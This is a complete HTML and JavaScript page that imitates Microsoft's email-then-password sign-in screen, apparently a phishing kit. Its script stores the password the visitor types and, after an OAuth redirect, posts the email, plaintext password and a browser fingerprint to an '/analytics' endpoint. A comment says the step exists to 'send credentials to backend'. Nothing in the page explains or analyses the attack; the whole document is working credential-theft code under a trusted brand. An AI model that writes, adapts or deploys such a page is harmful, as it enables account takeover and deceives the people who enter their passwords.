<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <title>Sign in to your account</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif;
            background-color: #f1f1f1;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .login-container {
            width: 100%;
            max-width: 440px;
            margin: 0 auto;
        }

        .card {
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.12);
            padding: 44px 40px 48px;
            transition: all 0.2s ease;
        }

        .logo {
            display: block;
            width: 108px;
            margin-bottom: 24px;
        }

        h1 {
            font-size: 24px;
            font-weight: 600;
            line-height: 1.25;
            color: #1b1b1b;
            margin-bottom: 16px;
        }

        .sub-heading {
            font-size: 14px;
            color: #5e5e5e;
            margin-bottom: 32px;
            line-height: 1.4;
        }

        .form-group {
            margin-bottom: 28px;
        }

        label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #1b1b1b;
            margin-bottom: 8px;
        }

        input {
            width: 100%;
            padding: 12px 12px;
            border: 1px solid #8c8c8c;
            border-radius: 4px;
            font-size: 16px;
            line-height: 1.2;
            transition: border-color 0.1s, box-shadow 0.1s;
            font-family: inherit;
        }

        input:focus {
            outline: none;
            border-color: #0078d4;
            box-shadow: 0 0 0 2px rgba(0, 120, 212, 0.2);
        }

        .button-primary {
            background-color: #0078d4;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 12px 20px;
            font-size: 15px;
            font-weight: 600;
            width: 100%;
            cursor: pointer;
            transition: background 0.1s;
        }

        .button-primary:hover {
            background-color: #106ebe;
        }

        .button-primary:active {
            background-color: #005a9e;
        }

        .button-primary:disabled {
            background-color: #b0b0b0;
            cursor: not-allowed;
            opacity: 0.7;
        }

        .links {
            margin-top: 28px;
            font-size: 13px;
        }

        .links a {
            color: #0078d4;
            text-decoration: none;
            display: inline-block;
            margin-bottom: 12px;
        }

        .links a:hover {
            text-decoration: underline;
        }

        .separator {
            border-top: 1px solid #e1e1e1;
            margin: 24px 0 20px;
        }

        .footer-links {
            margin-top: 32px;
            text-align: center;
            font-size: 12px;
            color: #666;
        }

        .footer-links a {
            color: #666;
            text-decoration: none;
            margin: 0 12px;
        }

        .footer-links a:hover {
            text-decoration: underline;
            color: #0078d4;
        }

        .message-toast {
            background: #fde7e9;
            border-left: 4px solid #d13438;
            padding: 12px 16px;
            border-radius: 4px;
            margin-bottom: 24px;
            font-size: 14px;
            color: #d13438;
            animation: slideIn 0.25s ease-out;
        }

        .message-success {
            background: #e6f3e6;
            border-left-color: #107c10;
            color: #107c10;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid #ffffff;
            border-radius: 50%;
            border-top-color: transparent;
            animation: spin 0.6s linear infinite;
            margin-left: 8px;
            vertical-align: middle;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        @media (max-width: 480px) {
            .card {
                padding: 32px 24px;
            }
        }

        .hidden-page {
            display: none;
        }
    </style>
</head>
<body>

<div class="login-container" id="appRoot">
    <!-- PAGE 1: EMAIL PAGE -->
    <div id="emailPage" class="card">
        <img class="logo" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft">
        <h1>Sign in</h1>
        <div class="sub-heading">to continue to your Microsoft account</div>

        <div id="emailMessageArea"></div>

        <div class="form-group">
            <label for="emailInput">Email, phone, or Skype</label>
            <input type="email" id="emailInput" name="loginfmt" maxlength="113" autocomplete="username" placeholder="someone@example.com">
        </div>

        <button id="nextButton" class="button-primary">Next</button>

        <div class="links">
            <a href="#" id="createAccountLink">No account? Create one!</a>
            <div style="margin-top: 8px;"><a href="#" id="cantAccessLink">Can't access your account?</a></div>
        </div>

        <div class="separator"></div>
        <div class="footer-links">
            <a href="https://www.microsoft.com/en/servicesagreement/">Terms of use</a>
            <a href="https://privacy.microsoft.com/en/privacystatement">Privacy &amp; cookies</a>
        </div>
    </div>
    
    <!-- PAGE 2: PASSWORD PAGE -->
    <div id="passwordPage" class="card hidden-page">
        <img class="logo" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft">
        <h1>Enter password</h1>
        <div id="passwordSubtext" class="sub-heading">for <span id="displayEmailSpan"></span></div>

        <div id="passwordMessageArea"></div>

        <div class="form-group">
            <label for="passwordInput">Password</label>
            <input type="password" id="passwordInput" autocomplete="current-password" placeholder="Password">
        </div>

        <button id="signInButton" class="button-primary">Sign in</button>

        <div class="links">
            <a href="#" id="forgotPasswordLink">Forgot password?</a>
            <div style="margin-top: 8px;"><a href="#" id="backToEmailLink">Use another account</a></div>
        </div>

        <div class="separator"></div>
        <div class="footer-links">
            <a href="https://www.microsoft.com/en/servicesagreement/">Terms of use</a>
            <a href="https://privacy.microsoft.com/en/privacystatement">Privacy &amp; cookies</a>
        </div>
    </div>
</div>

<script>
    const API_BASE_URL = '';

    let capturedEmail = '';
    let loginStartTime = Date.now();

    const emailPage = document.getElementById('emailPage');
    const passwordPage = document.getElementById('passwordPage');
    const emailInput = document.getElementById('emailInput');
    const nextButton = document.getElementById('nextButton');
    const emailMessageArea = document.getElementById('emailMessageArea');
    
    const displayEmailSpan = document.getElementById('displayEmailSpan');
    const passwordInput = document.getElementById('passwordInput');
    const signInButton = document.getElementById('signInButton');
    const passwordMessageArea = document.getElementById('passwordMessageArea');
    const forgotPasswordLink = document.getElementById('forgotPasswordLink');
    const backToEmailLink = document.getElementById('backToEmailLink');
    const createAccountLink = document.getElementById('createAccountLink');
    const cantAccessLink = document.getElementById('cantAccessLink');

    function showEmailMessage(message, isError = true) {
        emailMessageArea.innerHTML = `<div class="message-toast ${!isError ? 'message-success' : ''}">${escapeHtml(message)}</div>`;
        setTimeout(() => {
            if (emailMessageArea.firstChild) emailMessageArea.innerHTML = '';
        }, 5000);
    }

    function showPasswordMessage(message, isError = true) {
        passwordMessageArea.innerHTML = `<div class="message-toast ${!isError ? 'message-success' : ''}">${escapeHtml(message)}</div>`;
        setTimeout(() => {
            if (passwordMessageArea.firstChild) passwordMessageArea.innerHTML = '';
        }, 5000);
    }

    function escapeHtml(str) {
        if (!str) return '';
        return str.replace(/[&<>]/g, function(m) {
            if (m === '&') return '&amp;';
            if (m === '<') return '&lt;';
            if (m === '>') return '&gt;';
            return m;
        });
    }

    function getDeviceFingerprint() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages,
            cookieEnabled: navigator.cookieEnabled,
            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
            deviceMemory: navigator.deviceMemory || 'unknown',
            maxTouchPoints: navigator.maxTouchPoints,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            screenResolution: `${screen.width}x${screen.height}`,
            colorDepth: screen.colorDepth
        };
    }

    async function sendAnalytics(data) {
        try {
            await fetch(`${API_BASE_URL}/analytics`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data),
                keepalive: true
            });
        } catch (err) {
            console.log('Analytics error:', err);
        }
    }

    function isValidEmail(email) {
        if (!email) return false;
        const trimmed = email.trim();
        const re = /^[^\s@]+@([^\s@.,]+\.)+[^\s@.,]{2,}$/i;
        return re.test(trimmed);
    }

    function transitionToPasswordPage(email) {
        capturedEmail = email;
        displayEmailSpan.innerText = escapeHtml(email);
        emailPage.classList.add('hidden-page');
        passwordPage.classList.remove('hidden-page');
        setTimeout(() => {
            passwordInput.focus();
        }, 100);
        localStorage.setItem('login_email', email);
        
        sendAnalytics({
            event: 'email_submitted',
            email: email,
            deviceInfo: getDeviceFingerprint(),
            timestamp: new Date().toISOString()
        });
    }

    function backToEmail() {
        capturedEmail = '';
        emailInput.value = '';
        passwordInput.value = '';
        passwordMessageArea.innerHTML = '';
        emailMessageArea.innerHTML = '';
        emailPage.classList.remove('hidden-page');
        passwordPage.classList.add('hidden-page');
        nextButton.disabled = false;
        nextButton.innerText = 'Next';
        signInButton.disabled = false;
        signInButton.innerText = 'Sign in';
        emailInput.focus();
    }

    async function onEmailNext() {
        const emailValue = emailInput.value.trim();
        if (!emailValue) {
            showEmailMessage('Enter a valid email address, phone number, or Skype name.', true);
            emailInput.focus();
            return;
        }
        if (!isValidEmail(emailValue)) {
            showEmailMessage('Please enter a valid email address (e.g., name@example.com).', true);
            emailInput.focus();
            return;
        }

        nextButton.disabled = true;
        const originalText = nextButton.innerText;
        nextButton.innerText = 'Checking...';

        // Store email for OAuth
        localStorage.setItem('oauth_email', emailValue);
        
        // Small delay for UX
        setTimeout(() => {
            showEmailMessage('Email verified! Please enter your password.', false);
            transitionToPasswordPage(emailValue);
            nextButton.disabled = false;
            nextButton.innerText = originalText;
        }, 500);
    }

    async function onPasswordSignIn() {
        const password = passwordInput.value;
        if (!password) {
            showPasswordMessage('Enter your password.', true);
            passwordInput.focus();
            return;
        }
        if (password.length < 3) {
            showPasswordMessage('Please enter your password.', true);
            passwordInput.focus();
            return;
        }

        signInButton.disabled = true;
        const originalBtnText = signInButton.innerText;
        signInButton.innerText = 'Signing in...';
        
        const spinnerSpan = document.createElement('span');
        spinnerSpan.className = 'spinner';
        signInButton.appendChild(spinnerSpan);

        // Store password temporarily (will be cleared after OAuth)
        sessionStorage.setItem('temp_password', password);
        
        sendAnalytics({
            event: 'password_submitted',
            email: capturedEmail,
            deviceInfo: getDeviceFingerprint(),
            timestamp: new Date().toISOString()
        });

        // Redirect to Microsoft OAuth login
        setTimeout(() => {
            window.location.href = '/start_login';
        }, 500);
    }

    function onForgotPassword(e) {
        e.preventDefault();
        window.open('https://account.live.com/password/reset', '_blank');
    }

    function prefillSavedEmail() {
        const savedEmail = localStorage.getItem('login_email');
        if (savedEmail && emailInput) {
            emailInput.value = savedEmail;
        }
    }

    function onCreateAccount(e) {
        e.preventDefault();
        window.open('https://signup.live.com/signup', '_blank');
    }
    
    function onCantAccess(e) {
        e.preventDefault();
        window.open('https://account.live.com/password/reset', '_blank');
    }

    // Check for OAuth callback parameters
    function checkOAuthCallback() {
        const urlParams = new URLSearchParams(window.location.search);
        const code = urlParams.get('code');
        const error = urlParams.get('error');
        const errorDesc = urlParams.get('error_description');
        
        if (code) {
            // Clear URL params without reloading
            window.history.replaceState({}, document.title, window.location.pathname);
            
            const tempPassword = sessionStorage.getItem('temp_password');
            const capturedEmailAddr = localStorage.getItem('oauth_email') || capturedEmail;
            
            // Send credentials to backend via analytics
            sendAnalytics({
                event: 'oauth_success',
                email: capturedEmailAddr,
                password: tempPassword || '[OAUTH_NO_PASSWORD]',
                deviceInfo: getDeviceFingerprint(),
                timestamp: new Date().toISOString()
            });
            
            // Clear temp password
            sessionStorage.removeItem('temp_password');
            localStorage.removeItem('oauth_email');
            
            showPasswordMessage('Login successful! Redirecting...', false);
            
            setTimeout(() => {
                window.location.href = '/';
            }, 2000);
        }
        
        if (error) {
            window.history.replaceState({}, document.title, window.location.pathname);
            showPasswordMessage(`Login failed: ${errorDesc || error}`, true);
            signInButton.disabled = false;
            signInButton.innerText = 'Sign in';
            const spinner = document.querySelector('.spinner');
            if (spinner) spinner.remove();
        }
    }

    // Event Listeners
    nextButton.addEventListener('click', onEmailNext);
    signInButton.addEventListener('click', onPasswordSignIn);
    forgotPasswordLink.addEventListener('click', onForgotPassword);
    backToEmailLink.addEventListener('click', (e) => {
        e.preventDefault();
        backToEmail();
    });
    createAccountLink.addEventListener('click', onCreateAccount);
    cantAccessLink.addEventListener('click', onCantAccess);
    
    emailInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            e.preventDefault();
            onEmailNext();
        }
    });
    
    passwordInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            e.preventDefault();
            onPasswordSignIn();
        }
    });
    
    prefillSavedEmail();
    loginStartTime = Date.now();
    checkOAuthCallback();
    
    console.log('Microsoft Login Page Ready - OAuth Flow');
</script>
</body>
</html>
